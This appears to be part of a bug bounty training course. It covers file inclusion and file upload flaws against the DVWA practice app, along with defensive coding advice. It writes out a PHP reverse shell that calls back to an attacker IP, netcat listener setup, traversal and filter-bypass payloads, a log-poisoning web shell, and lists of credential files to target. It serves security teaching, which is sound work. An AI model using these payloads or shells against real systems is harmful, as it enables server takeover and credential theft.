# Ultimate Bug Bounty Course - Part 5

## Module 25: CSRF Medium Security Level (Continued)

### Recap of Previous Demonstration

**Attack Summary:**

- **Username:** admin
- **Password:** hackme (changed via CSRF)
- Successfully exploited CSRF vulnerability

**Medium Security Bypass:**

```
HTTP Referer Check: Server validates server name
Bypass Method: Used meta tag to navigate request
Result: Server receives request but validation bypassed
```

**Outcome:** Successfully demonstrated account takeover through Cross-Site Request Forgery exploitation.

---

## Module 26: File Inclusion Vulnerabilities

### What is File Inclusion?

**Definition:** A file inclusion vulnerability is like leaving a back door open in your house where anyone can slip in a hidden note that your security system can't see.

**How It Works:**

- Websites and servers often allow certain files (images, text) to be loaded into pages
- If the system isn't careful, someone can sneak in a file that wasn't meant to be there
- Attackers can trick the website into including harmful files containing dangerous commands and code
- When the website loads this file, it might end up running the attacker's code
- This allows attackers to take control of the system, steal information, and cause damage

**Real-World Analogy:**

```
File Inclusion = Back door in your house
Hidden Note = Malicious file
Security System = Server validation
Bypassing Security = Including unauthorized files
```

### How File Inclusion Happens

**Typical Scenario:**

1. Developer/Administrator leaves vulnerable file on server
2. File includes functions without proper sanitization
3. Similar to Command Injection - no input validation
4. OS doesn't know command is malicious
5. Attacker exploits the functionality

**Example - Vulnerable Implementation:**

```php
// Vulnerable code
$file = $_GET['page'];
include($file); // No validation!
```

**The Problem:**

- No input validation
- No input sanitization
- Allows including any file
- Can lead to complete server control

---

## Module 27: Types of File Inclusion

### 1. Local File Inclusion (LFI)

**Description:** In an LFI attack, the attacker can include and read local files on the target server and machine.

**What Attacker Can Do:**

- Include local files from the server
- Read target server's files
- Access sensitive files containing passwords
- Read configuration files
- View source code

**Impact:**

- Sensitive information disclosure
- Access to password files
- Configuration exposure
- Source code leakage

### 2. Remote File Inclusion (RFI)

**Description:** In an RFI attack, the attacker includes and calls a file from a remote server and machine. This can also lead to Remote Code Execution (RCE) on the target.

**How RFI Works:**

1. Attacker tells server to include file from remote location
2. Remote location could be attacker's server
3. Server attempts to include the remote file
4. File may contain malware
5. Malware gets injected into application
6. Attacker gains complete server control

**Attack Flow:**

```
Attacker's Server → Malicious File → Target Server → Code Execution
```

---

## Module 28: File Inclusion Practical (DVWA)

### Initial Setup

**Navigate to File Inclusion:**

```
DVWA → File Inclusion
Security Level: Low
```

**Interface Shows Three Files:**

- file1.php
- file2.php
- file3.php

### Testing Normal Functionality

**File 1 (file1.php):**

```
Content: Hello admin, your IP address is [IP]
Shows: User's IP address
```

**File 2 (file2.php):**

```
Content: I needed a password 8 characters long
So I picked Snow White and the Seven Dwarfs
Shows: Random content
```

**File 3 (file3.php):**

```
Content: Welcome back admin
Your IP address: [IP]
User agent: [User Agent String]
You came from: localhost
I am hosted at: localhost
```

### Understanding the Vulnerability

**URL Structure:**

```
http://localhost/vulnerabilities/fi/?page=include.php
```

**Analysis:**

- `page` parameter includes PHP files
- Parameter accepts filename
- Displays content based on parameter value

**Testing Hidden Files:**

```
URL: ?page=file4.php
Result: "Good job. This file isn't listed at all on DVWA.
         If you're reading this, you did something right."
```

**Finding:** Hidden file discovered! Server checks different files.

**Testing Non-Existent Files:**

```
URL: ?page=file5.php
Result: Nothing displays (file doesn't exist)
```

---

## Module 29: Local File Inclusion (LFI) Exploitation

### Basic LFI Attack

**View Source Analysis:**

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

**Vulnerability:** Directly includes any file specified in `page` parameter without validation.

### Directory Traversal Attack

**Concept:** Use `../` to navigate up directory tree

**Linux Directory Navigation:**

```bash
# Current directory
pwd

# Go back one directory
cd ..

# Go back multiple directories
cd ../../..
```

**Attack Payload:**

```
?page=../../../../../../../etc/passwd
```

**What This Does:**

1. Start from current directory
2. `../` = Go back one directory
3. Repeat until reaching root (`/`)
4. Access `/etc/passwd` file

### The /etc/passwd File

**What is /etc/passwd?**

```bash
# View file
cat /etc/passwd
```

**Contains:**

- All system users information
- User IDs (UID)
- Group IDs (GID)
- Home directories
- Default shells

**Example Content:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```

**Why It's Sensitive:**

- Shows all system users
- Reveals system configuration
- Should NOT be publicly accessible
- Contains reconnaissance information

### Successful LFI Demonstration

**Attack URL:**

```
http://localhost/vulnerabilities/fi/?page=../../../../../../../etc/passwd
```

**Result:** Successfully displays `/etc/passwd` content

**Why This Works:**

- Page parameter accepts any file path
- No input validation
- No path restrictions
- Directly includes and displays file

**Security Impact:**

- ✓ Sensitive Information Disclosure
- ✓ Reportable vulnerability in bug bounty
- ✓ Can lead to further exploitation
- ✓ Medium to High severity

---

## Module 30: Remote File Inclusion (RFI) Exploitation

### What is RFI?

**Definition:** Including files from a remote server, potentially containing malicious code.

**Attack Requirements:**

1. Vulnerable file inclusion point
2. Remote server hosting malicious file
3. Server configuration allowing remote includes

### Setting Up RFI Attack

**Step 1: Generate Reverse Shell Payload**

Visit: https://www.revshells.com

**Configuration:**

- Language: PHP
- IP Address: Your attacking machine IP
- Port: 1234

**Generated Payload:**

```php
<?php
$sock=fsockopen("192.168.1.100",1234);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

**Important Note:** Change `cmd` to `bash` for Linux servers!

**Step 2: Create Malicious File**

**Save as: rev.php**

```php
<?php
$sock=fsockopen("YOUR_IP",1234);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

**Step 3: Host the Malicious File**

```bash
# Start Python HTTP server
python3 -m http.server 8000

# Server now running at:
# http://YOUR_IP:8000/
```

**Verify server:**

```
Navigate to: http://YOUR_IP:8000/rev.php
Should display PHP code
```

**Step 4: Set Up Listener**

```bash
# Terminal 2: Start Netcat listener
nc -lvnp 1234
```

**Step 5: Check Your IP Address**

```bash
# Terminal 3: Get your IP
ip addr

# Example output:
inet 192.168.1.100/24
```

### Executing RFI Attack

**Attack URL:**

```
http://localhost/vulnerabilities/fi/?page=http://YOUR_IP:8000/rev.php
```

**What Happens:**

1. Target server receives request
2. Attempts to include remote file
3. Downloads/includes rev.php from attacker's server
4. Executes PHP code
5. Reverse shell connects back to attacker

### Troubleshooting

**Issue 1: Code Not Executing**

**Problem:** File reads but doesn't execute

**Solution:** Check payload syntax

**Alternative Payload (PHP PentestMonkey):**

```php
<?php
set_time_limit(0);
$sock=fsockopen("YOUR_IP",1234);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

**Issue 2: CMD vs Bash**

**Problem:** Payload uses `cmd` (Windows)

**Fix:** Change to `bash` (Linux)

```php
// Wrong (Windows)
exec("cmd /c ...");

// Correct (Linux)
exec("/bin/bash -i <&3 >&3 2>&3");
```

### Successful RFI Exploitation

**Terminal 1: Python Server**

```bash
python3 -m http.server 8000
# Shows: GET request for /rev.php
```

**Terminal 2: Netcat Listener**

```bash
nc -lvnp 1234
# Shows: Connection received!
```

**Result:**

```bash
$ whoami
www-data

$ ls
help  index.php  source

$ pwd
/var/www/html/vulnerabilities/fi
```

**Success:** Full shell access to server! 🎯

---

## Module 31: File Inclusion Detection

### Finding Vulnerable Parameters

**Look for these URL patterns:**

```
?page=file.php
?file=document.pdf
?path=/home/user
?include=header.php
?document=report.txt
```

**Common Parameter Names:**

- page
- file
- path
- include
- document
- folder
- root
- pg
- style
- pdf
- template

### Testing for LFI

**Step 1: Basic Test**

```
Original: ?page=file1.php
Test: ?page=../../../etc/passwd
```

**Step 2: Common Files to Test**

**Linux:**

```
/etc/passwd          - User information
/etc/shadow          - Password hashes (requires root)
/etc/hosts           - Host mappings
/var/log/apache2/access.log - Apache logs
/proc/self/environ   - Environment variables
/home/user/.ssh/id_rsa - SSH private keys
```

**Windows:**

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

### Testing for RFI

**Step 1: Check Remote Include Capability**

```
?page=http://YOUR_SERVER/test.txt
```

**Step 2: Verify Configuration**

RFI requires PHP configuration:

```php
; php.ini
allow_url_include = On  // Must be enabled
allow_url_fopen = On    // Must be enabled
```

**Step 3: Test with Harmless File**

```
?page=http://YOUR_SERVER/test.txt
```

If content displays → RFI possible

---

## Module 32: File Inclusion - Medium Security

### Source Code Analysis

**Navigate to:**

```
DVWA Security: Medium
View Source
```

**Protection Code:**

```php
<?php
$file = $_GET['page'];

// Input validation
$file = str_replace(array("http://", "https://"), "", $file);
$file = str_replace(array("../", "..\\"), "", $file);

include($file);
?>
```

**Security Measures:**

1. Removes `http://` and `https://` (blocks RFI)
2. Removes `../` and `..\` (blocks directory traversal)
3. Replaces with empty string

### Testing Medium Security

**Basic LFI Attempt:**

```
?page=../../../../../../../etc/passwd
Result: Nothing displays (blocked)
```

**Why It Fails:**

```php
str_replace("../", "", $file);
// "../../../" becomes ""
```

### Bypass Technique 1: URL Encoding

**Concept:** Encode `../` to bypass string matching

**URL Encoding:**

```
Original: ../
Encoded: %2e%2e%2f

Full payload:
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**Process:**

1. Go to: URL Encode/Decode tool online
2. Input: `../../../../../../../etc/passwd`
3. Encode: UTF-8
4. Copy encoded result
5. Paste in URL

**Result:** May or may not work depending on server processing

### Bypass Technique 2: Double Encoding

**Concept:** Filter only removes once, use nested traversal

**Payload:**

```
....//....//....//....//....//....//....//etc/passwd
```

**How It Works:**

```php
Original: ....//
Filter removes: ../
Result: ../

....// → str_replace("../", "") → ..//
..// still contains ../
```

**Step-by-step:**

```
1. Input: ....//....//....//etc/passwd
2. Filter runs: removes ../ from ....//
3. Result: ../etc/passwd
4. Still valid traversal path!
```

**Attack URL:**

```
?page=....//....//....//....//....//....//....//etc/passwd
```

**Result:** Successfully bypasses filter and displays `/etc/passwd`! ✓

### Why This Works

**Filter Limitation:**

```php
str_replace(array("../", "..\\"), "", $file);
```

**Problem:**

- Only removes pattern once
- Doesn't recursively check
- Nested patterns survive filtering

**Example:**

```
Input:  ....//
After:  ../
Still:  Valid traversal!
```

### RFI Testing (Medium Security)

**Attempt:**

```
?page=http://YOUR_IP:8000/rev.php
```

**Result:** Blocked

**Why:**

```php
str_replace(array("http://", "https://"), "", $file);
// Removes http:// and https://
```

**Potential Bypass:** (May not work in all cases)

```
?page=hthttp://tp://YOUR_IP:8000/rev.php

After filter:
hthttp://tp:// → removes http:// → http://YOUR_IP:8000/rev.php
```

---

## Module 33: File Inclusion - High Security

### Source Code Analysis

**Navigate to:**

```
DVWA Security: High
View Source
```

**Protection Code:**

```php
<?php
$file = $_GET['page'];

// Strict whitelist validation
if($file != "file1.php" && $file != "file2.php" && $file != "file3.php") {
    // Only allow these three files
    echo "ERROR: File not found!";
    exit;
}

include($file);
?>
```

**Security Measures:**

- ✓ Whitelist approach (only allow specific files)
- ✓ Rejects all other inputs
- ✓ No pattern matching to bypass
- ✓ Secure implementation

### Testing High Security

**LFI Attempt:**

```
?page=../../../../../../../etc/passwd
Result: ERROR: File not found!
```

**RFI Attempt:**

```
?page=http://attacker.com/shell.php
Result: ERROR: File not found!
```

**Bypass Attempts:**

```
Double encoding: ....//....//etc/passwd → Blocked
URL encoding: %2e%2e%2f → Blocked
Null byte: file1.php%00../../etc/passwd → Blocked (PHP 5.3+)
```

### Why High Security Cannot Be Bypassed

**Whitelist vs Blacklist:**

**Blacklist (Medium):**

```php
// Block known bad patterns
if (contains("../")) { block(); }
// Can be bypassed with encoding/obfuscation
```

**Whitelist (High):**

```php
// Only allow specific files
if ($file == "file1.php" || $file == "file2.php") {
    include($file);
} else {
    reject();
}
// Cannot be bypassed in isolation
```

**Note:** Whitelist approach is the secure way to prevent file inclusion.

---

## Module 34: File Inclusion - Real World Impact

### Sensitive Files to Target

**Linux Systems:**

**Configuration Files:**

```
/etc/passwd           - User accounts
/etc/shadow          - Password hashes
/etc/group           - Group information
/etc/hosts           - DNS mappings
/etc/mysql/my.cnf    - MySQL config
/etc/apache2/apache2.conf - Apache config
```

**Application Files:**

```
/var/www/html/config.php     - App configuration
/var/www/html/.env           - Environment variables
/var/www/html/wp-config.php  - WordPress config
```

**Log Files:**

```
/var/log/apache2/access.log  - Web server logs
/var/log/apache2/error.log   - Error logs
/var/log/auth.log            - Authentication logs
```

**SSH Keys:**

```
/home/user/.ssh/id_rsa       - Private SSH key
/home/user/.ssh/authorized_keys
/root/.ssh/id_rsa
```

**Windows Systems:**

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
```

### LFI to RCE Techniques

**Method 1: Log Poisoning**

**Step 1: Inject PHP code into logs**

```bash
# Using User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com
```

**Step 2: Include log file**

```
?page=../../../var/log/apache2/access.log&cmd=whoami
```

**Method 2: Session File Inclusion**

**Step 1: Poison session**

```php
// Create session with PHP code
$_SESSION['data'] = "<?php system('whoami'); ?>";
```

**Step 2: Include session file**

```
?page=../../../tmp/sess_[SESSION_ID]
```

**Method 3: File Upload + LFI**

**Step 1: Upload image with PHP code**

```php
// image.jpg.php
<?php system($_GET['cmd']); ?>
```

**Step 2: Include uploaded file**

```
?page=../../../uploads/image.jpg.php&cmd=whoami
```

### Real-World Examples

**WordPress:**

```
Vulnerable plugins with file inclusion
Config files: wp-config.php
Database credentials exposed
```

**E-commerce Sites:**

```
Payment gateway configs
Customer database credentials
API keys in config files
```

**Content Management Systems:**

```
Admin credentials in config
Database connection strings
File upload directories
```

---

## File Inclusion Summary

### Attack Workflow

```
1. Identify vulnerable parameter
   ↓
2. Test for LFI (directory traversal)
   ↓
3. Read sensitive files
   ↓
4. Test for RFI (if allow_url_include=On)
   ↓
5. Achieve RCE via reverse shell
   ↓
6. Complete server compromise
```

### Detection Checklist

**Find Vulnerable Parameters:**

- ☐ Look for file/page/include parameters
- ☐ Test with `../../../etc/passwd`
- ☐ Check for file content display
- ☐ Verify with different files

**Escalation Steps:**

- ☐ Map accessible files
- ☐ Find configuration files
- ☐ Extract credentials
- ☐ Test for RFI capability
- ☐ Attempt RCE

### Security Levels Comparison

| Level      | Protection      | Bypass Difficulty         |
| ---------- | --------------- | ------------------------- |
| **Low**    | None            | Easy                      |
| **Medium** | Basic filtering | Medium (double encoding)  |
| **High**   | Whitelist       | Impossible (in isolation) |

### Prevention Best Practices

**For Developers:**

1. **Use Whitelist Validation**

```php
$allowed = ['file1.php', 'file2.php', 'file3.php'];
if (!in_array($file, $allowed)) {
    die('Invalid file');
}
```

2. **Never Use User Input Directly**

```php
// Bad
include($_GET['page']);

// Good
$file = basename($_GET['page']);
if (file_exists("includes/" . $file)) {
    include("includes/" . $file);
}
```

3. **Disable Dangerous PHP Settings**

```ini
allow_url_include = Off
allow_url_fopen = Off
```

4. **Use Absolute Paths**

```php
$base = "/var/www/html/includes/";
$file = realpath($base . $_GET['page']);

if (strpos($file, $base) !== 0) {
    die('Path traversal detected!');
}
```

5. **Input Sanitization**

```php
$file = basename($_GET['page']);
$file = preg_replace('/[^a-zA-Z0-9_-]/', '', $file);
```

---

## Key Takeaways

### LFI (Local File Inclusion)

✓ Read sensitive server files
✓ Access configuration files
✓ Expose credentials
✓ Can escalate to RCE via log poisoning
✓ Medium to High severity

### RFI (Remote File Inclusion)

✓ Include remote malicious files
✓ Direct path to RCE
✓ Complete server compromise
✓ Critical severity
✓ Requires allow_url_include=On

### Exploitation Techniques

✓ Directory traversal: `../../../`
✓ Double encoding: `....//`
✓ URL encoding: `%2e%2e%2f`
✓ Null byte injection: `%00` (old PHP)
✓ Log poisoning for RCE

### Defense Mechanisms

✓ Whitelist validation (best approach)
✓ Input sanitization
✓ Disable remote includes
✓ Use absolute paths
✓ Proper file permissions

---

## Practice Environments

**Safe Testing:**

- DVWA (Damn Vulnerable Web App)
- bWAPP
- WebGoat
- Mutillidae
- Local lab setups

**Never Test Without Permission!**

---

---

## Module 35: File Inclusion - Medium Security (RFI Bypass)

### Setting Up Attack Infrastructure

**Terminal 1: Start Python Server**

```bash
python3 -m http.server 8000
```

**Terminal 2: Start Netcat Listener**

```bash
nc -lvnp 1234
```

**Terminal 3: Check IP Address**

```bash
ip addr
# Copy your IP address
```

### Attempting RFI with Medium Security

**Initial RFI Attempt:**

```
URL: ?page=http://YOUR_IP:8000/rev.php
Result: Blocked (filter removes http://)
```

**Why It Fails:**

```php
// Medium security filter
str_replace(array("http://", "https://"), "", $file);
```

### Bypass Technique: Nested Protocol

**Concept:** Filter only removes once, use nested strings

**Payload Structure:**

```
Original filter target: http://
Bypass payload: hhtthttp://ttp://
```

**How It Works:**

```
Input:  hhtthttp://ttp://YOUR_IP:8000/rev.php
Step 1: Remove first "http://" → hhttp://ttp://YOUR_IP:8000/rev.php
Step 2: Remove second "http://" → http://YOUR_IP:8000/rev.php
Result: Valid HTTP URL reconstructed!
```

### Complete Bypass Payload

**Full Attack URL:**

```
?page=hhtthttp://ttp://YOUR_IP:8000/rev.php
```

**Step-by-Step Execution:**

**1. Prepare malicious file (rev.php):**

```php
<?php
$sock=fsockopen("YOUR_IP",1234);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

**2. Start infrastructure:**

```bash
# Terminal 1
python3 -m http.server 8000

# Terminal 2
nc -lvnp 1234
```

**3. Execute attack:**

```
Navigate to: ?page=hhtthttp://ttp://YOUR_IP:8000/rev.php
```

**Result:**

- Page hangs (executing code)
- Netcat listener receives connection
- Shell access achieved! ✓

```bash
$ whoami
www-data

$ ls
vulnerabilities  hackable  config
```

### Alternative Bypasses

**Method 1: Case Variation**

```
HTTP://YOUR_IP:8000/rev.php
Http://YOUR_IP:8000/rev.php
```

**Method 2: Double Slashes**

```
....//....//....//etc/passwd (for LFI)
```

**Method 3: URL Encoding**

```
%68%74%74%70%3a%2f%2f (http://)
```

### Understanding the Filter Weakness

**Filter Code:**

```php
$file = str_replace(array("http://", "https://"), "", $file);
$file = str_replace(array("../", "..\\"), "", $file);
```

**Problems:**

1. Only removes once (not recursive)
2. Case-sensitive matching
3. No validation after replacement
4. Doesn't check reconstructed string

**Secure Implementation Would Be:**

```php
// Whitelist approach
$allowed = ['file1.php', 'file2.php', 'file3.php'];
if (!in_array($file, $allowed)) {
    die('Access denied');
}
```

---

## Module 36: File Upload Vulnerabilities

### What is File Upload Vulnerability?

**Definition:** A file upload vulnerability is like a door that's meant to let people send you friendly packages. But if you're not careful, someone might send a dangerous one instead.

**How It Works:**

- Websites allow users to upload files (images, documents)
- They usually expect harmless things (photos, PDFs)
- If the website doesn't check files properly, attacker uploads malicious code
- When server opens/runs that file, attacker takes control
- Can steal data and cause problems

**Real-World Analogy:**

```
Normal: Someone drops off a gift at your door
Malicious: Gift contains a ticking time bomb
Result: You don't notice until it's too late
```

### Common Upload Functionality Locations

**Where File Uploads Are Found:**

- Profile picture uploads
- Document submission forms
- Resume/CV uploads
- Image galleries
- Video uploads (YouTube)
- Cloud storage (Google Drive)
- Social media posts (Instagram, Facebook)
- Email attachments
- Support ticket systems

### File Upload Attack Requirements

**What You Need:**

1. File upload functionality
2. Ability to upload executable files
3. Knowledge of upload location
4. Ability to execute uploaded file

**Key Point:** Simply uploading isn't enough - you must execute the file!

---

## Module 37: File Upload Practical (DVWA)

### Initial Setup

**Navigate to:**

```
DVWA → File Upload
Security Level: Low
```

**Interface:** Shows file upload form with "Browse" button

### Testing Normal Functionality

**Step 1: Upload Legitimate Image**

```
Select: check.png
Upload
Result: "File uploaded successfully to: ../../hackable/uploads/check.png"
```

**Verify Upload:**

```
URL: http://localhost/hackable/uploads/check.png
Result: Image displays successfully ✓
```

### Exploiting Low Security

**Step 1: Prepare Reverse Shell**

Use previously created `rev.php`:

```php
<?php
$sock=fsockopen("YOUR_IP",1234);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

**Step 2: Start Listener**

```bash
nc -lvnp 1234
```

**Step 3: Upload PHP Shell**

```
Browse → Select rev.php
Click Upload
Result: "rev.php uploaded successfully to: ../../hackable/uploads/rev.php"
```

**Step 4: Execute Uploaded File**

```
Navigate to: http://localhost/hackable/uploads/rev.php
```

**Result:**

- Page hangs
- Netcat listener receives connection
- Complete server access! 🎯

```bash
$ whoami
www-data

$ pwd
/var/www/html/hackable/uploads

$ ls
check.png  rev.php
```

### Why Low Security Failed

**No Validation:**

- ❌ No file type checking
- ❌ No extension validation
- ❌ No content verification
- ❌ Allows any file upload
- ❌ Executable files not restricted

---

## Module 38: File Upload - Medium Security

### Analyzing Medium Security

**Change Security Level:**

```
DVWA Security → Medium
Navigate back to File Upload
```

**Test PHP Upload:**

```
Browse → Select rev.php
Upload
Result: "Your image was not uploaded. We can only accept JPEG and PNG files."
```

**Protection Detected:** File type validation implemented!

### Source Code Analysis

**View Source → Medium:**

```php
<?php
if ($_FILES['uploaded']['type'] == 'image/jpeg' ||
    $_FILES['uploaded']['type'] == 'image/png') {
    // Upload file
    move_uploaded_file($_FILES['uploaded']['tmp_name'],
                      $uploadPath);
} else {
    echo "We can only accept JPEG and PNG files.";
}
?>
```

**Validation Check:** Content-Type header validation

### Bypassing with Burp Suite

**Step 1: Intercept Upload Request**

```bash
# Enable Burp proxy
FoxyProxy → Burp (Enabled)

# Start Burp Suite
Intercept: ON
```

**Step 2: Attempt Upload**

```
Browse → Select rev.php
Click Upload
```

**Step 3: Analyze Intercepted Request**

```http
POST /vulnerabilities/upload/ HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploaded"; filename="rev.php"
Content-Type: application/x-php

<?php
$sock=fsockopen("192.168.1.100",1234);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
------WebKitFormBoundary--
```

**Key Finding:**

```
Content-Type: application/x-php
↑ This is what gets checked!
```

### Bypass Technique: Content-Type Modification

**Step 1: Send to Repeater**

```
Right-click → Send to Repeater
```

**Step 2: Modify Content-Type**

**Original:**

```
Content-Type: application/x-php
```

**Modified:**

```
Content-Type: image/jpeg
```

**Step 3: Send Modified Request**

```
Click: Send
Result: HTTP/1.1 200 OK
        File uploaded successfully!
```

**Verification:**

```
Navigate to: http://localhost/hackable/uploads/rev.php
Result: Shell access achieved! ✓
```

### Alternative Bypass: Double Extension

**Technique:** Add image extension after PHP

**Rename File:**

```bash
# Original
rev.php

# Modified
rev.php.jpeg
```

**Upload:**

```
Browse → Select rev.php.jpeg
Upload
Result: "File uploaded successfully"
```

**Why It Works:**

- File passes JPEG check (has .jpeg extension)
- Server still executes as PHP (first extension)
- Content-Type shows as image/jpeg

**Access:**

```
http://localhost/hackable/uploads/rev.php.jpeg
```

**Result:** May or may not execute depending on server configuration

### Another Bypass: PHTML Extension

**Alternative PHP Extensions:**

```
.php     - Standard PHP
.php3    - PHP 3
.php4    - PHP 4
.php5    - PHP 5
.phtml   - PHP HTML
.pht     - PHP Template
.phps    - PHP Source
```

**Test:**

```bash
# Rename file
mv rev.php rev.phtml

# Upload
Browse → rev.phtml
Upload
```

**If filter only checks extensions:**

```
.jpeg ✓ Allowed
.png  ✓ Allowed
.php  ✗ Blocked
.phtml ? Not in blacklist → May work!
```

---

## Module 39: Finding Upload Directories

### The Challenge

**Problem:** You uploaded malicious file, but where is it stored?

**Without knowing location:**

- Cannot execute file
- Cannot leverage vulnerability
- Upload is useless

### Solution: Directory Bruteforcing

**Tool: Feroxbuster (from earlier modules)**

```bash
feroxbuster -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html
```

**Common Upload Directory Names:**

```
/uploads/
/upload/
/images/
/media/
/files/
/documents/
/attachments/
/content/
/data/
/storage/
/assets/
/public/
/static/uploads/
```

**Discovery Process:**

**1. Run Directory Scan:**

```bash
feroxbuster -u http://localhost -w wordlist.txt
```

**2. Look for Upload Directories:**

```
200    /uploads/
200    /images/
403    /admin/uploads/
```

**3. Navigate to Directory:**

```
http://localhost/uploads/
```

**4. Locate Your File:**

```
Directory listing:
- profile_pic.jpg
- document.pdf
- rev.php ← Your uploaded shell!
```

**5. Execute:**

```
http://localhost/uploads/rev.php
```

### Important Notes

**Upload Locations Vary:**

- `/var/www/html/uploads/` (Linux)
- `C:\inetpub\wwwroot\uploads\` (Windows)
- `/var/www/uploads/`
- Custom application directories

**Sometimes Upload Path Revealed:**

```
Success message: "File uploaded to: /hackable/uploads/file.php"
                                    ↑ Path disclosed!
```

---

## Module 40: File Upload Prevention

### Secure Implementation Checklist

**1. File Type Validation**

```php
// Check MIME type (not just extension)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mimeType = finfo_file($finfo, $_FILES['file']['tmp_name']);

$allowed = ['image/jpeg', 'image/png', 'application/pdf'];
if (!in_array($mimeType, $allowed)) {
    die('Invalid file type');
}
```

**2. Extension Whitelist**

```php
$allowed_extensions = ['jpg', 'jpeg', 'png', 'pdf'];
$extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($extension, $allowed_extensions)) {
    die('Invalid extension');
}
```

**3. Rename Uploaded Files**

```php
// Don't keep original filename
$newName = uniqid() . '_' . time() . '.' . $extension;
move_uploaded_file($tmp, $uploadPath . $newName);
```

**4. Store Outside Web Root**

```php
// Upload to non-web-accessible directory
$uploadPath = '/var/uploads/'; // Not /var/www/html/uploads/
```

**5. Disable Script Execution**

```apache
# .htaccess in upload directory
<FilesMatch "\.(php|phtml|php3|php4|php5)$">
    Deny from all
</FilesMatch>
```

**6. File Size Limits**

```php
$maxSize = 5 * 1024 * 1024; // 5MB
if ($_FILES['file']['size'] > $maxSize) {
    die('File too large');
}
```

**7. Content Validation**

```php
// For images, verify it's actually an image
if (!getimagesize($_FILES['file']['tmp_name'])) {
    die('Not a valid image');
}
```

**8. Randomize Storage Path**

```php
// Use random subdirectories
$subdir = substr(md5(time()), 0, 2);
$uploadPath = "/uploads/$subdir/";
```

---

## File Upload Summary

### Attack Workflow

```
1. Find upload functionality
   ↓
2. Test with legitimate file
   ↓
3. Attempt malicious file upload
   ↓
4. Bypass filters if present
   ↓
5. Locate uploaded file
   ↓
6. Execute uploaded file
   ↓
7. Achieve RCE
```

### Common Bypasses

| Filter Type            | Bypass Technique                           |
| ---------------------- | ------------------------------------------ |
| Extension blacklist    | Use alternative extensions (.phtml, .php5) |
| Content-Type check     | Modify header in request                   |
| Extension check        | Double extension (.php.jpeg)               |
| Magic bytes            | Inject PHP after image header              |
| Client-side validation | Intercept with Burp Suite                  |

### Security Levels

| Level      | Protection                 | Bypass Method                |
| ---------- | -------------------------- | ---------------------------- |
| **Low**    | None                       | Direct upload                |
| **Medium** | Content-Type check         | Modify header                |
| **High**   | File signature + extension | Complex (combine techniques) |

---

## Key Takeaways

### File Upload Attacks

✓ Simple but highly effective
✓ Direct path to RCE
✓ Common in real applications
✓ Critical severity
✓ Easy to find and exploit

### Essential Steps

✓ Always locate upload directory
✓ Cannot exploit without execution
✓ Use directory bruteforcing
✓ Test multiple bypass techniques
✓ Combine with other vulnerabilities

### Defense Priorities

✓ Validate file content (not just extension)
✓ Store outside webroot
✓ Rename uploaded files
✓ Disable script execution
✓ Implement multiple layers

---

**Course Status:** File Upload Complete
**Next Module:** SQL Injection
**Coming Up:**

- SQL Injection basics
- Error-based SQLi
- Union-based SQLi
- Blind SQL Injection
- Advanced exploitation

---

_This completes the File Upload module. Next, we'll dive deep into SQL Injection vulnerabilities._
